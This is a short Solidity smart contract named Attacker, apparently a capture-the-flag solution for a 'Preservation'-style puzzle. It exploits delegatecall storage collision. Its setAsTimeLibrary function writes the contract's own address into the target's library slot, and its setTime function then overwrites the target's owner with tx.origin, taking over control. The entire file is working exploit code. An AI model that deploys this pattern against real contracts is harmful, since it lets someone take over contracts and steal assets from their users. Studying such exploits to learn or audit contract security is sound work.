// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;
	uint storedTime;

	function setAsTimeLibrary(address _preservation) external {
		_preservation.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(this)))));
	}

	function setTime(uint256 _time) external {
		owner = tx.origin;
	}
}
